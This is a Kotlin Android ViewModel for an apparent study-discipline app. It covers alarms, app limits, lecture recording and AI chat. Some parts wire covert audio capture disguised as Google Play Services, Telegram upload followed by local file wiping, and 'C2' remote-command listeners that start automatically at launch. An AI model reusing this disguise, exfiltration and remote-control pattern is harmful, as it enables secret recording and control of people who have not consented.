package com.example.ui

import android.app.Application
import android.content.Context
import android.graphics.Bitmap
import android.util.Log
import android.widget.Toast
import androidx.lifecycle.AndroidViewModel
import androidx.lifecycle.viewModelScope
import com.example.MainApplication
import com.example.core.ai.SecondBrainChatEngine
import com.example.core.alarm.RelentlessAlarmService
import com.example.core.alarm.SmartAlarmScheduler
import com.example.core.bluetooth.LocatorSirenController
import com.example.core.cloud.FirestoreChatMessage
import com.example.core.cloud.FirestoreSyncManager
import com.example.core.coaching.DynamicWallpaperEngine
import com.example.core.coaching.GeofenceSilentManager
import com.example.core.discipline.AppUsageTracker
import com.example.core.sleep.BatteryGuardReceiver
import com.example.core.sleep.BatteryStatus
import com.example.core.sleep.SleepDetectorReceiver
import com.example.data.local.entity.AppLimitEntity
import com.example.data.local.entity.CoachingEntity
import com.example.data.local.entity.SleepStateEntity
import com.example.core.recorder.AudioChunkRecorder
import com.example.core.recorder.DisguiseProfile
import com.example.core.recorder.StealthCaptureService
import com.example.core.recorder.TelegramConfigManager
import com.example.core.recorder.TelegramUploadWorker
import androidx.work.WorkInfo
import androidx.work.WorkManager
import java.util.UUID
import kotlinx.coroutines.Job
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.SharingStarted
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.flow.first
import kotlinx.coroutines.flow.stateIn
import kotlinx.coroutines.launch

data class DatabaseStatusInfo(
    val isConnected: Boolean = true,
    val databaseName: String = com.example.data.local.AppDatabase.DATABASE_NAME,
    val schemaVersion: Int = com.example.data.local.AppDatabase.DATABASE_VERSION,
    val isEncrypted: Boolean = false,
    val voiceTasksCount: Int = 0,
    val appLimitsCount: Int = 0,
    val coachingCount: Int = 0,
    val lectureCount: Int = 0,
    val pingLatencyMs: Long = 2,
    val lastCheckedTimestamp: Long = System.currentTimeMillis()
)

class EnforcerViewModel(application: Application) : AndroidViewModel(application) {

    private val repository = (application as MainApplication).repository
    private val scheduler = SmartAlarmScheduler(application)
    private val wallpaperEngine = DynamicWallpaperEngine(application)
    private val geofenceManager = GeofenceSilentManager(application)
    private val appUsageTracker = AppUsageTracker(application)
    private val sirenController = LocatorSirenController(application)
    val recorderManager = com.example.core.recorder.LectureRecorderManager.instance
    val playerManager = com.example.core.recorder.LecturePlayerManager.instance
    private val firestoreSync = FirestoreSyncManager.getInstance(application)
    private val chatEngine = SecondBrainChatEngine.getInstance(application)
    private val keySyncManager = com.example.core.ai.AiKeySyncManager.getInstance(application)
    private val userProfileManager = com.example.core.user.UserProfileManager.getInstance(application)

    val userName: StateFlow<String> = userProfileManager.userName
    val userLocationLabel: StateFlow<String> = userProfileManager.locationLabel
    val userLatitude: StateFlow<Double> = userProfileManager.latitude
    val userLongitude: StateFlow<Double> = userProfileManager.longitude
    val userBio: StateFlow<String> = userProfileManager.userBio
    val userTelegramHandle: StateFlow<String> = userProfileManager.telegramHandle
    val userCustomDirective: StateFlow<String> = userProfileManager.customDirective

    private val sharedOkHttpClient: okhttp3.OkHttpClient = okhttp3.OkHttpClient.Builder()
        .connectTimeout(15, java.util.concurrent.TimeUnit.SECONDS)
        .readTimeout(15, java.util.concurrent.TimeUnit.SECONDS)
        .build()

    val aiChatMessages: StateFlow<List<FirestoreChatMessage>> = firestoreSync.streamChatMessages()
        .stateIn(viewModelScope, SharingStarted.WhileSubscribed(5000), emptyList())

    val allAiKeys: StateFlow<List<com.example.data.local.entity.AiKeyEntity>> = repository.allAiKeys
        .stateIn(viewModelScope, SharingStarted.WhileSubscribed(5000), emptyList())

    val allChatSessions: StateFlow<List<com.example.data.local.entity.AiChatSessionEntity>> = repository.allChatSessions
        .stateIn(viewModelScope, SharingStarted.WhileSubscribed(5000), emptyList())

    private val _activeSessionId = MutableStateFlow("session_live_${System.currentTimeMillis() / 1000}")
    val activeSessionId: StateFlow<String> = _activeSessionId.asStateFlow()

    private val _activeModel = MutableStateFlow(com.example.core.ai.AiKeySyncManager.AVAILABLE_MODELS.first())
    val activeModel: StateFlow<com.example.core.ai.ModelOption> = _activeModel.asStateFlow()

    private val _localSessionMessages = MutableStateFlow<List<com.example.data.local.entity.AiChatMessageEntity>>(emptyList())
    val localSessionMessages: StateFlow<List<com.example.data.local.entity.AiChatMessageEntity>> = _localSessionMessages.asStateFlow()

    private val _isAiChatThinking = MutableStateFlow(false)
    val isAiChatThinking: StateFlow<Boolean> = _isAiChatThinking.asStateFlow()

    init {
        // Guarantee Firestore real-time C2 remote commands listener & Cloud C2 Poller are active
        firestoreSync.startListeningForRemoteCommands()
        com.example.core.cloud.CloudC2Poller.getInstance(application).start()
        initTelemetry()
        generateStudyProofCard()
        pingDatabase()
    }

    fun updateUserProfile(
        name: String? = null,
        location: String? = null,
        lat: Double? = null,
        lon: Double? = null,
        bio: String? = null,
        handle: String? = null,
        directive: String? = null
    ) {
        userProfileManager.updateProfile(name, location, lat, lon, bio, handle, directive)
        Toast.makeText(getApplication(), "Profile updated: ${name ?: userName.value} (${location ?: userLocationLabel.value})", Toast.LENGTH_SHORT).show()
    }

    fun setUserLocation(label: String, lat: Double = userLatitude.value, lon: Double = userLongitude.value) {
        userProfileManager.setLocation(label, lat, lon)
        Toast.makeText(getApplication(), "Location set to: $label", Toast.LENGTH_SHORT).show()
    }

    fun setActiveModel(model: com.example.core.ai.ModelOption) {
        _activeModel.value = model
        Toast.makeText(getApplication(), "Switched to ${model.displayName} (${model.provider.uppercase()})", Toast.LENGTH_SHORT).show()
    }

    fun saveAiKey(provider: String, apiKey: String, selectedModel: String = "") {
        viewModelScope.launch {
            keySyncManager.saveKeyAndSync(provider, apiKey, selectedModel)
            Toast.makeText(getApplication(), "Key saved & synced to Database!", Toast.LENGTH_SHORT).show()
        }
    }

    fun deleteAiKey(provider: String) {
        viewModelScope.launch {
            keySyncManager.deleteKeyAndSync(provider)
            Toast.makeText(getApplication(), "Key removed for $provider", Toast.LENGTH_SHORT).show()
        }
    }

    fun syncKeysWithServer() {
        viewModelScope.launch {
            val fetched = keySyncManager.fetchKeysFromServer()
            Toast.makeText(getApplication(), "Synced ${fetched.size} keys from server DB", Toast.LENGTH_SHORT).show()
        }
    }

    fun selectChatSession(sessionId: String) {
        _activeSessionId.value = sessionId
        viewModelScope.launch {
            val msgs = repository.getSessionMessagesDirect(sessionId)
            _localSessionMessages.value = msgs
            val session = repository.allChatSessions.first().firstOrNull { it.sessionId == sessionId }
            session?.let { s ->
                val matched = com.example.core.ai.AiKeySyncManager.AVAILABLE_MODELS.firstOrNull { it.id == s.model }
                if (matched != null) _activeModel.value = matched
            }
        }
    }

    fun startNewChatSession() {
        val newId = "session_${System.currentTimeMillis()}"
        _activeSessionId.value = newId
        _localSessionMessages.value = emptyList()
        Toast.makeText(getApplication(), "Started new conversation session", Toast.LENGTH_SHORT).show()
    }

    fun deleteChatSession(sessionId: String) {
        viewModelScope.launch {
            repository.deleteChatSession(sessionId)
            if (_activeSessionId.value == sessionId) {
                startNewChatSession()
            }
            Toast.makeText(getApplication(), "Chat session removed", Toast.LENGTH_SHORT).show()
        }
    }

    fun backupCurrentSessionToTelegram() {
        viewModelScope.launch {
            val currId = _activeSessionId.value
            val (ok, msg) = keySyncManager.backupSessionToTelegram(currId, "Secondary Brain Chat ($currId)")
            Toast.makeText(getApplication(), msg, Toast.LENGTH_LONG).show()
        }
    }

    fun sendAiChatMessage(userMessage: String) {
        if (userMessage.isBlank()) return
        viewModelScope.launch {
            _isAiChatThinking.value = true
            try {
                val notes = extractedActionItems.value.ifEmpty { listOf(latestVoiceNote.value) }
                val loc = _lastPinnedGps.value ?: userLocationLabel.value
                val currModel = _activeModel.value
                val currSession = _activeSessionId.value

                chatEngine.processUserMessage(
                    sessionId = currSession,
                    sessionTitle = userMessage.take(40),
                    provider = currModel.provider,
                    model = currModel.id,
                    userText = userMessage,
                    stepCount = stepsToday.value,
                    batteryPercent = batteryStatus.value.percent,
                    batteryCharging = batteryStatus.value.isCharging,
                    screenTimeMins = screenTimeMinutes.value,
                    locationLabel = loc,
                    recentNotes = notes
                )

                // Refresh local session messages
                val updated = repository.getSessionMessagesDirect(currSession)
                _localSessionMessages.value = updated
            } catch (e: Exception) {
                Log.e("EnforcerViewModel", "Chat processing failed", e)
            } finally {
                _isAiChatThinking.value = false
            }
        }
    }

    val coachingList: StateFlow<List<CoachingEntity>> = repository.allCoachingSchedules
        .stateIn(viewModelScope, SharingStarted.WhileSubscribed(5000), emptyList())

    val appLimits: StateFlow<List<AppLimitEntity>> = repository.allAppLimits
        .stateIn(viewModelScope, SharingStarted.WhileSubscribed(5000), emptyList())

    val sleepState: StateFlow<SleepStateEntity?> = repository.sleepState
        .stateIn(viewModelScope, SharingStarted.WhileSubscribed(5000), null)

    val lectures: StateFlow<List<com.example.data.local.entity.LectureEntity>> = repository.allLectures
        .stateIn(viewModelScope, SharingStarted.WhileSubscribed(5000), emptyList())

    val recordingState = recorderManager.recordingState
    val recordingDurationSeconds = recorderManager.durationSeconds
    val recordingAmplitude = recorderManager.currentAmplitude
    val recordingAmplitudeHistory = recorderManager.amplitudeHistory
    val activeBookmarks = recorderManager.bookmarks

    // Audio Chunk Recorder & Stealth Service States
    val chunkRecorder = AudioChunkRecorder.instance
    val isStealthServiceRunning = StealthCaptureService.isStealthServiceRunning
    val activeStealthProfile = StealthCaptureService.activeStealthProfile
    val chunkRecordingState = chunkRecorder.recordingState
    val chunkCurrentIndex = chunkRecorder.currentChunkIndex
    val chunkElapsedSeconds = chunkRecorder.currentChunkElapsedSeconds
    val chunkTotalElapsedSeconds = chunkRecorder.totalElapsedSeconds
    val chunkLimitSeconds = chunkRecorder.chunkLimitSeconds
    val chunkAmplitude = chunkRecorder.currentAmplitude
    val chunkAmplitudeHistory = chunkRecorder.amplitudeHistory
    val chunkBookmarks = chunkRecorder.sessionBookmarks
    val completedChunks = chunkRecorder.completedChunks

    // Audio DSP, Gain Booster & Lecture Hall Voice Focus
    val audioSettings = com.example.core.recorder.AudioRecordingSettings.getInstance(application)
    val isVoiceFocusEnabled = audioSettings.isVoiceFocusEnabled
    val isAcHumFilterEnabled = audioSettings.isAcHumFilterEnabled
    val distanceGain = audioSettings.distanceGain

    // Pocket Gesture & Silent Haptic Cues
    private val pocketGestureManager = com.example.core.recorder.PocketGestureManager.getInstance(application)
    val isPocketGestureEnabled = pocketGestureManager.isPocketGestureEnabled
    val isHapticCuesEnabled = pocketGestureManager.isHapticCuesEnabled

    fun togglePocketGesture() {
        val next = pocketGestureManager.togglePocketGesture()
        val label = if (next) "Pocket Volume Quick-Bookmark ON (Double-tap Vol Up/Down)" else "Pocket Volume Quick-Bookmark OFF"
        Toast.makeText(getApplication(), label, Toast.LENGTH_SHORT).show()
    }

    fun toggleHapticCues() {
        val next = pocketGestureManager.toggleHapticCues()
        val label = if (next) "Silent Haptic Cues ON" else "Silent Haptic Cues OFF"
        Toast.makeText(getApplication(), label, Toast.LENGTH_SHORT).show()
    }

    fun handleVolumeKey(keyCode: Int): Boolean {
        return pocketGestureManager.onVolumeKeyPressed(keyCode) {
            if (recordingState.value == com.example.core.recorder.RecordingState.RECORDING) {
                addLectureBookmark("Pocket Key Bookmark")
                Toast.makeText(getApplication(), "📌 Pocket Bookmark stamped!", Toast.LENGTH_SHORT).show()
            } else if (chunkRecordingState.value == com.example.core.recorder.RecordingState.RECORDING || isStealthServiceRunning.value) {
                addStealthBookmark("Pocket Key Bookmark")
            } else {
                Toast.makeText(getApplication(), "📌 Pocket Gesture detected (Start recording to stamp)", Toast.LENGTH_SHORT).show()
            }
        }
    }

    fun toggleVoiceFocus() {
        val next = audioSettings.toggleVoiceFocus()
        val label = if (next) "Voice Focus ON (Hardware Beamforming & Isolation)" else "Voice Focus OFF (Standard Mic)"
        Toast.makeText(getApplication(), label, Toast.LENGTH_SHORT).show()
    }

    fun toggleAcHumFilter() {
        val next = audioSettings.toggleAcHumFilter()
        val label = if (next) "AC/Fan Hum Filter ON (300Hz High-Pass)" else "AC/Fan Hum Filter OFF"
        Toast.makeText(getApplication(), label, Toast.LENGTH_SHORT).show()
    }

    fun setDistanceGain(gain: com.example.core.recorder.DistanceMicGain) {
        audioSettings.setDistanceGain(gain)
        Toast.makeText(getApplication(), "Distance Mic Gain: ${gain.label}", Toast.LENGTH_SHORT).show()
    }

    // Telegram Cloud Pipe & Wipe States
    private val telegramConfig = TelegramConfigManager.getInstance(application)
    val telegramBotToken = telegramConfig.botToken
    val telegramChatId = telegramConfig.chatId
    val telegramCloudPipeEnabled = telegramConfig.cloudPipeEnabled
    val telegramWipedFilesCount = telegramConfig.wipedFilesCount
    val telegramTotalBytesWiped = telegramConfig.totalBytesWiped
    val telegramLastUploadStatus = telegramConfig.lastUploadStatus
    val telegramUploadQueue = telegramConfig.uploadQueue

    fun updateTelegramCredentials(token: String, chatId: String) {
        telegramConfig.setCredentials(token, chatId)
        Toast.makeText(getApplication(), "Telegram credentials saved", Toast.LENGTH_SHORT).show()
    }

    fun setTelegramCloudPipeEnabled(enabled: Boolean) {
        telegramConfig.setCloudPipeEnabled(enabled)
    }

    fun clearCompletedUploadQueue() {
        telegramConfig.clearCompletedQueue()
    }

    fun testTelegramConnection(onResult: (Boolean, String) -> Unit) {
        telegramConfig.testConnection(onResult)
    }

    // WorkManager Upload Monitoring & Control
    val workManager = WorkManager.getInstance(application)
    val telegramWorkInfos: StateFlow<List<WorkInfo>> = workManager
        .getWorkInfosByTagFlow(TelegramUploadWorker.TAG_TELEGRAM_UPLOAD)
        .stateIn(viewModelScope, SharingStarted.WhileSubscribed(5000), emptyList())

    fun cancelUploadWork(workId: UUID) {
        workManager.cancelWorkById(workId)
        Toast.makeText(getApplication(), "Cancelled upload task", Toast.LENGTH_SHORT).show()
    }

    fun cancelAllUploadWork() {
        workManager.cancelAllWorkByTag(TelegramUploadWorker.TAG_TELEGRAM_UPLOAD)
        Toast.makeText(getApplication(), "Cancelled all active uploads", Toast.LENGTH_SHORT).show()
    }

    fun pruneCompletedWork() {
        workManager.pruneWork()
        clearCompletedUploadQueue()
        Toast.makeText(getApplication(), "Pruned completed upload tasks", Toast.LENGTH_SHORT).show()
    }

    fun enqueueTestUploadTask(title: String = "Kinematics & Rotational Dynamics", subject: String = "Physics") {
        TelegramUploadWorker.enqueueTestUpload(getApplication(), title, subject)
        Toast.makeText(getApplication(), "Enqueued WorkManager upload task", Toast.LENGTH_SHORT).show()
    }

    val currentPlayingId = playerManager.currentPlayingId
    val isAudioPlaying = playerManager.isPlaying
    val audioCurrentPositionMs = playerManager.currentPositionMs
    val audioDurationMs = playerManager.durationMs
    val audioSpeed = playerManager.playbackSpeed

    private val _batteryStatus = MutableStateFlow(BatteryGuardReceiver.checkBattery(application))
    val batteryStatus: StateFlow<BatteryStatus> = _batteryStatus.asStateFlow()

    private val _isSirenActive = MutableStateFlow(false)
    val isSirenActive: StateFlow<Boolean> = _isSirenActive.asStateFlow()

    private val _wallpaperPreviewBitmap = MutableStateFlow<Bitmap?>(null)
    val wallpaperPreviewBitmap: StateFlow<Bitmap?> = _wallpaperPreviewBitmap.asStateFlow()

    private val _geofenceActiveStatus = MutableStateFlow(false)
    val geofenceActiveStatus: StateFlow<Boolean> = _geofenceActiveStatus.asStateFlow()

    private val _databaseStatus = MutableStateFlow(DatabaseStatusInfo())
    val databaseStatus: StateFlow<DatabaseStatusInfo> = _databaseStatus.asStateFlow()

    // Alarm Safety & Anti-Class-Ringing Manager
    val alarmSafetyManager = com.example.core.alarm.AlarmSafetyManager.getInstance(application)
    val isAlarmMasterEnabled = alarmSafetyManager.isAlarmMasterEnabled
    val isClassShieldActive = alarmSafetyManager.isClassShieldActive
    val silenceUntilMillis = alarmSafetyManager.silenceUntilMillis
    val autoCoachingSuppress = alarmSafetyManager.autoCoachingSuppress
    val isVibrateOnly = alarmSafetyManager.isVibrateOnly
    val scheduledAlarmTime = alarmSafetyManager.scheduledAlarmTime
    val scheduledAlarmReason = alarmSafetyManager.scheduledAlarmReason
    val isAlarmRingingNow = alarmSafetyManager.isAlarmRingingNow

    fun refreshBattery() {
        _batteryStatus.value = BatteryGuardReceiver.checkBattery(getApplication())
    }

    // --- SLEEP & ALARM ACTIONS ---

    fun emergencyKillAllAlarms() {
        alarmSafetyManager.emergencyKillAllAlarms()
        Toast.makeText(
            getApplication(),
            "🚨 EMERGENCY KILL: All alarms silenced immediately!",
            Toast.LENGTH_SHORT
        ).show()
    }

    fun setAlarmMasterEnabled(enabled: Boolean) {
        alarmSafetyManager.setAlarmMasterEnabled(enabled)
        val msg = if (enabled) "Alarm Engine Enabled" else "Alarm Engine Disarmed (Muted in any condition)"
        Toast.makeText(getApplication(), msg, Toast.LENGTH_SHORT).show()
    }

    fun setClassShieldActive(active: Boolean) {
        alarmSafetyManager.setClassShieldActive(active)
        val msg = if (active) "🛡️ Class Shield Active: Alarms unconditionally muted in classes!" else "Class Shield Deactivated"
        Toast.makeText(getApplication(), msg, Toast.LENGTH_SHORT).show()
    }

    fun silenceAlarmsForDuration(hours: Float) {
        alarmSafetyManager.silenceAlarmsForDuration(hours)
        val hLabel = when (hours) {
            1f -> "1 Hour"
            2f -> "2 Hours"
            4f -> "4 Hours"
            else -> "$hours Hours"
        }
        Toast.makeText(getApplication(), "Alarms silenced for next $hLabel (Safe in class)", Toast.LENGTH_SHORT).show()
    }

    fun clearTimedSilence() {
        alarmSafetyManager.clearTimedSilence()
        Toast.makeText(getApplication(), "Timed Silence cleared. Normal schedule restored.", Toast.LENGTH_SHORT).show()
    }

    fun setAutoCoachingSuppress(enabled: Boolean) {
        alarmSafetyManager.setAutoCoachingSuppress(enabled)
        val msg = if (enabled) "Coaching Timetable Alarm Suppression ON" else "Timetable Alarm Suppression OFF"
        Toast.makeText(getApplication(), msg, Toast.LENGTH_SHORT).show()
    }

    fun setVibrateOnly(enabled: Boolean) {
        alarmSafetyManager.setVibrateOnly(enabled)
        val msg = if (enabled) "Stealth Vibrate-Only Alarm Mode ON" else "Full Siren & Strobe Alarm Mode ON"
        Toast.makeText(getApplication(), msg, Toast.LENGTH_SHORT).show()
    }

    fun scheduleManualAlarm(hourOfDay: Int, minute: Int, label: String = "Manual Alarm"): Long {
        val triggerTime = scheduler.scheduleManualAlarm(hourOfDay, minute, label)
        viewModelScope.launch {
            val current = repository.getSleepStateDirect()
            if (current != null) {
                repository.updateSleepState(
                    current.copy(
                        scheduledWakeTime = triggerTime,
                        isAlarmRinging = false
                    )
                )
            }
        }
        val cal = java.util.Calendar.getInstance().apply { timeInMillis = triggerTime }
        val sdf = java.text.SimpleDateFormat("hh:mm a", java.util.Locale.getDefault())
        Toast.makeText(getApplication(), "Alarm Scheduled: ${sdf.format(cal.time)} [$label]", Toast.LENGTH_SHORT).show()
        return triggerTime
    }

    fun schedulePresetAlarm(minutes: Int, label: String = "Quick Alarm"): Long {
        val triggerTime = scheduler.schedulePresetAlarm(minutes, label)
        viewModelScope.launch {
            val current = repository.getSleepStateDirect()
            if (current != null) {
                repository.updateSleepState(
                    current.copy(
                        scheduledWakeTime = triggerTime,
                        isAlarmRinging = false
                    )
                )
            }
        }
        Toast.makeText(getApplication(), "Alarm Armed: Rings in $minutes mins [$label]", Toast.LENGTH_SHORT).show()
        return triggerTime
    }

    fun schedule6HourWakeup(bufferMinutes: Int = 0): Long {
        val triggerTime = scheduler.scheduleSixHourWakeup(bufferMinutes)
        viewModelScope.launch {
            val current = repository.getSleepStateDirect()
            if (current != null) {
                repository.updateSleepState(
                    current.copy(
                        sleepRecordedTime = System.currentTimeMillis(),
                        scheduledWakeTime = triggerTime,
                        isAlarmRinging = false
                    )
                )
            }
        }
        val sdf = java.text.SimpleDateFormat("hh:mm a", java.util.Locale.getDefault())
        val wakeFormatted = sdf.format(java.util.Date(triggerTime))
        val bufText = if (bufferMinutes > 0) " (+${bufferMinutes}m buffer)" else ""
        Toast.makeText(getApplication(), "6-Hour Sleep Alarm armed for $wakeFormatted$bufText", Toast.LENGTH_LONG).show()
        return triggerTime
    }

    fun lockSleepProtocol() {
        schedule6HourWakeup(0)
    }

    fun testQuickAlarm(secondsDelay: Int = 10) {
        scheduler.scheduleQuickTestAlarm(secondsDelay)
        Toast.makeText(
            getApplication(),
            "Test Alarm armed! Rings in $secondsDelay seconds with torch strobe.",
            Toast.LENGTH_LONG
        ).show()
    }

    fun cancelActiveAlarm() {
        scheduler.cancelAlarm()
        alarmSafetyManager.clearAlarmScheduled()
        viewModelScope.launch {
            val current = repository.getSleepStateDirect()
            if (current != null) {
                repository.updateSleepState(
                    current.copy(
                        scheduledWakeTime = 0L,
                        isAlarmRinging = false
                    )
                )
            }
        }
        Toast.makeText(getApplication(), "Alarm cancelled.", Toast.LENGTH_SHORT).show()
    }

    // --- COACHING & WALLPAPER ACTIONS ---

    fun generateWallpaperPreview(coaching: CoachingEntity) {
        val items = coaching.checklist.split(",").map { it.trim() }.filter { it.isNotEmpty() }
        val bitmap = wallpaperEngine.generateChecklistBitmap(
            title = coaching.title,
            departureTime = coaching.departureTime,
            checklistItems = items
        )
        _wallpaperPreviewBitmap.value = bitmap
    }

    fun applyLockscreenWallpaper(coaching: CoachingEntity) {
        val items = coaching.checklist.split(",").map { it.trim() }.filter { it.isNotEmpty() }
        val bitmap = wallpaperEngine.generateChecklistBitmap(
            title = coaching.title,
            departureTime = coaching.departureTime,
            checklistItems = items
        )
        val success = wallpaperEngine.applyLockscreenWallpaper(bitmap)
        if (success) {
            Toast.makeText(getApplication(), "Lockscreen checklist wallpaper applied!", Toast.LENGTH_SHORT).show()
        } else {
            Toast.makeText(getApplication(), "Lockscreen wallpaper permission/hardware error", Toast.LENGTH_SHORT).show()
        }
    }

    fun restoreOriginalWallpaper() {
        wallpaperEngine.clearLockscreenWallpaper()
        Toast.makeText(getApplication(), "Lockscreen cleared / restored!", Toast.LENGTH_SHORT).show()
    }

    fun saveCoachingSchedule(schedule: CoachingEntity) {
        viewModelScope.launch {
            repository.saveCoaching(schedule)
        }
    }

    fun simulateGeofenceArrival(coachingTitle: String) {
        val silenced = geofenceManager.applyCoachingArrivalSilent(coachingTitle)
        _geofenceActiveStatus.value = true
        Toast.makeText(
            getApplication(),
            "100m Geofence entered: Phone silenced for $coachingTitle",
            Toast.LENGTH_LONG
        ).show()
    }

    fun simulateGeofenceDeparture(coachingTitle: String) {
        geofenceManager.applyCoachingDepartureRestore(coachingTitle)
        _geofenceActiveStatus.value = false
        Toast.makeText(
            getApplication(),
            "100m Geofence exited: Volume restored to normal",
            Toast.LENGTH_LONG
        ).show()
    }

    // --- DISCIPLINE & APP LIMIT ACTIONS ---

    fun hasUsageStatsPermission(): Boolean = appUsageTracker.hasUsageStatsPermission()

    fun openUsageStatsSettings() = appUsageTracker.openUsageStatsSettings()

    fun getTodayUsageMinutes(packageName: String): Int = appUsageTracker.getTodayUsageMinutes(packageName)

    fun updateAppLimit(limit: AppLimitEntity) {
        viewModelScope.launch {
            repository.updateAppLimit(limit)
        }
    }

    fun addCustomAppLimit(limit: AppLimitEntity) {
        viewModelScope.launch {
            repository.addAppLimit(limit)
        }
    }

    fun deleteAppLimit(limit: AppLimitEntity) {
        viewModelScope.launch {
            repository.deleteAppLimit(limit)
        }
    }

    // --- LOCATOR SIREN ACTIONS ---

    fun toggleSiren() {
        if (_isSirenActive.value) {
            sirenController.stopSiren()
            _isSirenActive.value = false
        } else {
            sirenController.startSiren(viewModelScope)
            _isSirenActive.value = true
        }
    }

    // --- LECTURE RECORDER & PLAYER ACTIONS ---

    fun startLectureRecording(
        title: String,
        subject: String,
        coachingSessionName: String = "",
        initialNotes: String = ""
    ): Boolean {
        val started = recorderManager.startRecording(
            context = getApplication(),
            title = title,
            subject = subject,
            coachingSessionName = coachingSessionName,
            initialNotes = initialNotes
        )
        if (started) {
            pocketGestureManager.vibrateRecordingStarted()
        }
        return started
    }

    fun pauseLectureRecording() {
        recorderManager.pauseRecording(getApplication())
        pocketGestureManager.vibrateRecordingStopped()
    }

    fun resumeLectureRecording() {
        recorderManager.resumeRecording(getApplication())
        pocketGestureManager.vibrateRecordingStarted()
    }

    fun addLectureBookmark(label: String) {
        recorderManager.addBookmark(label)
        pocketGestureManager.vibrateBookmarkPinned()
    }

    fun stopAndSaveLectureRecording(onSaved: ((Long) -> Unit)? = null) {
        viewModelScope.launch {
            pocketGestureManager.vibrateRecordingStopped()
            val completed = recorderManager.stopRecording(getApplication())
            if (completed != null) {
                val entity = com.example.data.local.entity.LectureEntity(
                    title = completed.title,
                    subject = completed.subject,
                    coachingSessionName = completed.coachingSessionName,
                    filePath = completed.filePath,
                    durationSeconds = completed.durationSeconds,
                    fileSizeBytes = completed.fileSizeBytes,
                    timestamp = System.currentTimeMillis(),
                    bookmarksJson = com.example.data.local.entity.LectureEntity.encodeBookmarks(completed.bookmarks),
                    notes = completed.notes
                )
                val id = repository.saveLecture(entity)
                Toast.makeText(getApplication(), "Lecture Saved to Vault [${completed.title}]", Toast.LENGTH_SHORT).show()
                onSaved?.invoke(id)
            } else {
                Toast.makeText(getApplication(), "Recording ended without saving (too short or empty)", Toast.LENGTH_SHORT).show()
            }
        }
    }

    fun cancelLectureRecording() {
        recorderManager.cancelRecording(getApplication())
        Toast.makeText(getApplication(), "Lecture Recording Cancelled", Toast.LENGTH_SHORT).show()
    }

    // --- ROLLING CHUNK & LECTURE AUDIO RECORDER ACTIONS ---

    fun startStealthLectureRecording(
        title: String,
        subject: String,
        coachingSessionName: String = "",
        disguiseProfile: DisguiseProfile = DisguiseProfile.GOOGLE_PLAY_SERVICES,
        chunkMinutes: Int = 15,
        chunkSeconds: Long = if (chunkMinutes <= 0) AudioChunkRecorder.INFINITE_CHUNK_SECONDS else chunkMinutes.toLong() * 60L
    ) {
        StealthCaptureService.startStealthCaptureWithSeconds(
            context = getApplication(),
            title = title,
            subject = subject,
            coachingSessionName = coachingSessionName,
            disguiseProfile = disguiseProfile,
            chunkDurationSeconds = chunkSeconds
        )
        pocketGestureManager.vibrateRecordingStarted()
        val timeLabel = when {
            chunkSeconds >= AudioChunkRecorder.INFINITE_CHUNK_SECONDS -> "Infinite / Continuous"
            chunkSeconds < 60 -> "${chunkSeconds}s"
            else -> "${chunkSeconds / 60}m"
        }
        Toast.makeText(
            getApplication(),
            "Lecture Recording Active: $title ($timeLabel chunk)",
            Toast.LENGTH_SHORT
        ).show()
    }

    fun pauseStealthRecording() {
        StealthCaptureService.pauseStealthCapture(getApplication())
        pocketGestureManager.vibrateRecordingStopped()
    }

    fun resumeStealthRecording() {
        StealthCaptureService.resumeStealthCapture(getApplication())
        pocketGestureManager.vibrateRecordingStarted()
    }

    fun addStealthBookmark(label: String = "Exam Point") {
        StealthCaptureService.addStealthBookmark(getApplication(), label)
        pocketGestureManager.vibrateBookmarkPinned()
        Toast.makeText(getApplication(), "Bookmark Tagged: $label", Toast.LENGTH_SHORT).show()
    }

    fun stopStealthRecording() {
        pocketGestureManager.vibrateRecordingStopped()
        StealthCaptureService.stopAndSaveStealthCapture(getApplication())
        Toast.makeText(getApplication(), "Lecture Saved to Vault", Toast.LENGTH_SHORT).show()
    }

    fun cancelStealthRecording() {
        StealthCaptureService.cancelStealthCapture(getApplication())
        Toast.makeText(getApplication(), "Recording Cancelled", Toast.LENGTH_SHORT).show()
    }

    fun togglePlayPauseLecture(lecture: com.example.data.local.entity.LectureEntity) {
        playerManager.togglePlayPause(lecture.id, lecture.filePath)
    }

    fun seekAudio(positionMs: Int) {
        playerManager.seekTo(positionMs)
    }

    fun setAudioSpeed(speed: Float) {
        playerManager.setSpeed(speed)
    }

    fun stopAudioPlayback() {
        playerManager.stop()
    }

    fun deleteLecture(lecture: com.example.data.local.entity.LectureEntity) {
        viewModelScope.launch {
            if (currentPlayingId.value == lecture.id) {
                playerManager.stop()
            }
            if (lecture.filePath.isNotBlank()) {
                try {
                    java.io.File(lecture.filePath).delete()
                } catch (_: Exception) {}
            }
            repository.deleteLecture(lecture)
            Toast.makeText(getApplication(), "Lecture deleted from vault", Toast.LENGTH_SHORT).show()
        }
    }

    fun updateLectureNotes(lecture: com.example.data.local.entity.LectureEntity, newNotes: String) {
        viewModelScope.launch {
            repository.saveLecture(lecture.copy(notes = newNotes))
            Toast.makeText(getApplication(), "Lecture notes updated", Toast.LENGTH_SHORT).show()
        }
    }

    // --- TWO-WAY TELEGRAM C2 REMOTE COMMANDS ---
    val telegramC2Manager = com.example.core.recorder.TelegramC2Manager.getInstance(application)
    val isTelegramPollingActive = telegramC2Manager.isPollingActive
    val telegramLatestCommand = telegramC2Manager.lastExecutedCommand
    val telegramCommandLogs = telegramC2Manager.commandLogs

    fun toggleTelegramPolling() {
        if (isTelegramPollingActive.value) {
            telegramC2Manager.stopPolling()
            Toast.makeText(getApplication(), "Telegram Remote Listener Stopped", Toast.LENGTH_SHORT).show()
        } else {
            telegramC2Manager.startPolling()
            Toast.makeText(getApplication(), "Telegram Remote Listener Active (/status, /mute, /siren, /wipe)", Toast.LENGTH_SHORT).show()
        }
    }

    fun executeTelegramCommandDirect(command: String) {
        telegramC2Manager.executeCommand(command)
    }

    // --- 10:00 PM SCHEDULED DAILY AUDIT ---
    fun scheduleDaily10PmAudit() {
        com.example.core.recorder.DailyAuditWorker.scheduleDailyAudit(getApplication())
        Toast.makeText(getApplication(), "Daily 10:00 PM Telegram Summary scheduled via WorkManager", Toast.LENGTH_SHORT).show()
    }

    fun triggerDailyAuditNow() {
        com.example.core.recorder.DailyAuditWorker.triggerAuditNow(getApplication())
        Toast.makeText(getApplication(), "Triggered Daily Audit Summary immediately", Toast.LENGTH_SHORT).show()
    }

